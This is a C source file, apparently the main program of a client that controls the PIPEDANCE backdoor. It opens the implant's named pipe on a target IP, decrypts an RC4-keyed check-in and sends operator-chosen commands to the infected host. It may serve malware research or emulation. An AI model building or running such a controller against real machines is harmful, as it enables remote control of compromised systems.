#include <Windows.h>
#include <assert.h>
#include <stdio.h>
#include <tlhelp32.h>

#include "client.h"
#include "def.h"
#include "helpers.h"
#include "rc4.h"

uint32_t ask_user_command()
{
    uint32_t command_id = 0;

    printf("\n*** PIPEDANCE Command Menu ***\n\n");

    for (size_t i = 0; i < cl_get_command_list_length(); i++)
    {
        printf("\t%d: %s\n", COMMAND_LIST[i].id, COMMAND_LIST[i].description);
    }

    h_get_user_dword("\nPlease enter in command ID : ", &command_id);

    return command_id;
}

void print_checkin_info(const checkin_t* checkin)
{
    assert(checkin);

    printf("*** PIPEDANCE Initial Check-In ***\n");
    printf("\n\tPID: %d\n", checkin->pid);
    printf("\tWorking Directory: %S\n", checkin->current_process_directory);
    printf("\tRunning As: %S\n", checkin->domain_and_username);
}

uint32_t main(uint32_t argc, const char** argv)
{
    uint32_t command = 0;
    uint32_t malware_pid = 0;
    size_t target_machine_length = 0;
    char* target_machine = NULL;
    HANDLE pipe = INVALID_HANDLE_VALUE;
    checkin_t* checkin = NULL;

    if (argc < 2)
        h_error("Usage:\n%s TARGET-IP\n", argv[0]);

    target_machine_length = strlen(argv[1]) + 1;
    target_machine = (char*)calloc(1, target_machine_length);

    if (!target_machine)
        h_error("Failed to allocate target_machine memory\n");
    strcpy_s(target_machine, target_machine_length, argv[1]);

    pipe = cl_open_malware_pipe_1(target_machine);

    checkin = comm_process_initial_checkin(pipe, RC4_KEY, RC4_KEY_LENGTH);
    malware_pid = checkin->pid;
    print_checkin_info(checkin);

    cl_initialize_handlers();

    while (true)
    {
        command = ask_user_command();
        if (STOP == command)
            break;
        cl_process_command(pipe, target_machine, malware_pid, command);
    }

    if (target_machine)
        free(target_machine);
    if (checkin)
        free(checkin);
    if (INVALID_HANDLE_VALUE != pipe)
        CloseHandle(pipe);

    return 0;
}
